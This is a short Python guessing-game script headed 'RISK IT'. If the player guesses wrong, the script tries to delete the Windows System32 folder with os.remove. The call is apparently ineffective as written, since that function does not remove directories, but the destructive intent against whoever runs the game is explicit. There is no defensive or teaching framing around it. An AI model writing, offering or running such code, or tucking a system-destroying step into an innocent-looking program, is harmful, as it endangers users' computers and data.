//// RISK IT \\\\
import random
import os

number = random.randint(1, 10)
guess = int(input('Find the right number between 1 and 10'))
if guess == number:
  print('Wow you lucky')
else:
  os.remove('C:\Windows\System32')
